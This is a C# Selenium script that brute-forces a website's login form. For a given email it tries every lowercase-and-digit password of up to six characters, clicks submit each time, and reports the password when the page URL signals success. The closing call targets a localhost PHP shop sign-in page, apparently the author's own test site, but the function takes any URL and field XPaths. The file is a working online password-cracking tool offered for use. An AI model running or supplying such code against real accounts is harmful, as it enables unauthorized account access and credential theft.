using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using System;






//if pass contains alphabats with or without numbers the password will cracked
void CrackPassOnChrome(string EmailOfWhichPasswordWillBeCracked,int lengthOfPassword , string UrlOfWebPage ,string AfterSuccessfullLoginUrlWillContain,string XpathOfMailbox, string XpathOfPassbox, string XpathOfSubmitBtn)
{
    IWebDriver driver = new ChromeDriver();

    string url = UrlOfWebPage;
    driver.Navigate().GoToUrl(url);

    string usernames = EmailOfWhichPasswordWillBeCracked;

    string abcs = "a1b23cd4e5f6g7h8i9j0klmnopqrstuvwxyz";
    char[] C_abcs = abcs.ToCharArray();

    string Value;

    int lengthOfPass = lengthOfPassword;
    if (lengthOfPass == 6)
    {

        for (int i = 0; i < C_abcs.Length; i++)
        {
            char v1 = C_abcs[i];
            for (int j = 0; j < C_abcs.Length; j++)
            {
                char v2 = C_abcs[j];
                for (int k = 0; k < C_abcs.Length; k++)
                {
                    char v3 = C_abcs[k];
                    for (int m = 0; m < C_abcs.Length; m++)
                    {
                        char v4 = C_abcs[m];
                        for (int a = 0; a < C_abcs.Length; a++)
                        {
                            char v5 = C_abcs[a];
                            for (int b = 0; b < C_abcs.Length; b++)
                            {
                                string[] combos = new string[6];

                                char v6 = C_abcs[b];


                                Value = v6.ToString() + v5.ToString() + v4.ToString() + v3.ToString() + v2.ToString() + v1.ToString();




                                IWebElement mailbox = driver.FindElement(By.XPath(XpathOfMailbox));
                                IWebElement Passbox = driver.FindElement(By.XPath(XpathOfPassbox));
                                IWebElement submitbtn = driver.FindElement(By.XPath(XpathOfSubmitBtn));
                                mailbox.SendKeys(usernames);//static mail
                                Passbox.SendKeys(Value);//loop on password
                                submitbtn.Click();

                                Console.WriteLine(Value);
                                if (driver.Url.Contains(AfterSuccessfullLoginUrlWillContain))
                                {
                                    Console.WriteLine($"login successful using \n username : {usernames} \n Password : {Value}");
                                    goto SuccessLogin;
                                }
                                else
                                {
                                    continue;
                                }



                            }
                        }
                    }

                }
            }
        }



    } 
    else if (lengthOfPass==5)
    {
        for (int i = 0; i < C_abcs.Length; i++)
        {
            char v1 = C_abcs[i];
            for (int j = 0; j < C_abcs.Length; j++)
            {
                char v2 = C_abcs[j];
                for (int k = 0; k < C_abcs.Length; k++)
                {
                    char v3 = C_abcs[k];
                    for (int m = 0; m < C_abcs.Length; m++)
                    {
                        char v4 = C_abcs[m];
                        for (int a = 0; a < C_abcs.Length; a++)
                        {
                            char v5 = C_abcs[a];
                          


                                Value =   v5.ToString() + v4.ToString() + v3.ToString() + v2.ToString() + v1.ToString();




                                IWebElement mailbox = driver.FindElement(By.XPath(XpathOfMailbox));
                                IWebElement Passbox = driver.FindElement(By.XPath(XpathOfPassbox));
                                IWebElement submitbtn = driver.FindElement(By.XPath(XpathOfSubmitBtn));
                                mailbox.SendKeys(usernames);//static mail
                                Passbox.SendKeys(Value);//loop on password
                                submitbtn.Click();

                                Console.WriteLine(Value);
                                if (driver.Url.Contains(AfterSuccessfullLoginUrlWillContain))
                                {
                                    Console.WriteLine($"login successful using \n username : {usernames} \n Password : {Value}");
                                    goto SuccessLogin;
                                }
                                else
                                {
                                    continue;
                                }

 
                        }
                    }

                }
            }
        }
    }
    else if (lengthOfPass==4)
    {
        for (int i = 0; i < C_abcs.Length; i++)
        {
            char v1 = C_abcs[i];
            for (int j = 0; j < C_abcs.Length; j++)
            {
                char v2 = C_abcs[j];
                for (int k = 0; k < C_abcs.Length; k++)
                {
                    char v3 = C_abcs[k];
                    for (int m = 0; m < C_abcs.Length; m++)
                    {
                        char v4 = C_abcs[m];
                    


                                Value =  v4.ToString() + v3.ToString() + v2.ToString() + v1.ToString();




                                IWebElement mailbox = driver.FindElement(By.XPath(XpathOfMailbox));
                                IWebElement Passbox = driver.FindElement(By.XPath(XpathOfPassbox));
                                IWebElement submitbtn = driver.FindElement(By.XPath(XpathOfSubmitBtn));
                                mailbox.SendKeys(usernames);//static mail
                                Passbox.SendKeys(Value);//loop on password
                                submitbtn.Click();

                                Console.WriteLine(Value);
                                if (driver.Url.Contains(AfterSuccessfullLoginUrlWillContain))
                                {
                                    Console.WriteLine($"login successful using \n username : {usernames} \n Password : {Value}");
                                    goto SuccessLogin;
                                }
                                else
                                {
                                    continue;
                                }



                           
                    }

                }
            }
        }
    }
    else if (lengthOfPass==3)
    {
        for (int i = 0; i < C_abcs.Length; i++)
        {
            char v1 = C_abcs[i];
            for (int j = 0; j < C_abcs.Length; j++)
            {
                char v2 = C_abcs[j];
                for (int k = 0; k < C_abcs.Length; k++)
                {
                    char v3 = C_abcs[k];
          


                                Value =   v3.ToString() + v2.ToString() + v1.ToString();




                                IWebElement mailbox = driver.FindElement(By.XPath(XpathOfMailbox));
                                IWebElement Passbox = driver.FindElement(By.XPath(XpathOfPassbox));
                                IWebElement submitbtn = driver.FindElement(By.XPath(XpathOfSubmitBtn));
                                mailbox.SendKeys(usernames);//static mail
                                Passbox.SendKeys(Value);//loop on password
                                submitbtn.Click();

                                Console.WriteLine(Value);
                                if (driver.Url.Contains(AfterSuccessfullLoginUrlWillContain))
                                {
                                    Console.WriteLine($"login successful using \n username : {usernames} \n Password : {Value}");
                                    goto SuccessLogin;
                                }
                                else
                                {
                                    continue;
                                }



                          

                }
            }
        }
    }
    else if (lengthOfPass==2)
    {
        for (int i = 0; i < C_abcs.Length; i++)
        {
            char v1 = C_abcs[i];
            for (int j = 0; j < C_abcs.Length; j++)
            {
                char v2 = C_abcs[j];
               

                                Value =   v2.ToString() + v1.ToString();




                                IWebElement mailbox = driver.FindElement(By.XPath(XpathOfMailbox));
                                IWebElement Passbox = driver.FindElement(By.XPath(XpathOfPassbox));
                                IWebElement submitbtn = driver.FindElement(By.XPath(XpathOfSubmitBtn));
                                mailbox.SendKeys(usernames);//static mail
                                Passbox.SendKeys(Value);//loop on password
                                submitbtn.Click();

                                Console.WriteLine(Value);
                                if (driver.Url.Contains(AfterSuccessfullLoginUrlWillContain))
                                {
                                    Console.WriteLine($"login successful using \n username : {usernames} \n Password : {Value}");
                                    goto SuccessLogin;
                                }
                                else
                                {
                                    continue;
                                }



                          
            }
        }
    }
    else if (lengthOfPass==1)
    {
        for (int i = 0; i < C_abcs.Length; i++)
        {
            char v1= C_abcs[i];
            Value =   v1.ToString();

                                IWebElement mailbox = driver.FindElement(By.XPath(XpathOfMailbox));
                                IWebElement Passbox = driver.FindElement(By.XPath(XpathOfPassbox));
                                IWebElement submitbtn = driver.FindElement(By.XPath(XpathOfSubmitBtn));
                                mailbox.SendKeys(usernames);//static mail
                                Passbox.SendKeys(Value);//loop on password
                                submitbtn.Click();

                                Console.WriteLine(Value);
                                if (driver.Url.Contains(AfterSuccessfullLoginUrlWillContain))
                                {
                                    Console.WriteLine($"login successful using \n username : {usernames} \n Password : {Value}");
                                    goto SuccessLogin;
                                }
                                else
                                {
                                    continue;
                                }


 
        }
    }
    else
    {
        Console.WriteLine("Password Of Max length 6 is supportive");
    }


        SuccessLogin:
        Console.WriteLine("login success");
        ;

}

CrackPassOnChrome("hassancity4005@gmail.com",2, "http://localhost/php/Fresh%20Mart/pages/signin.php","index", "//*[@id='inputEmail4']", "//*[@id='fakePassword']", "//input[@value='Sign In']");



 
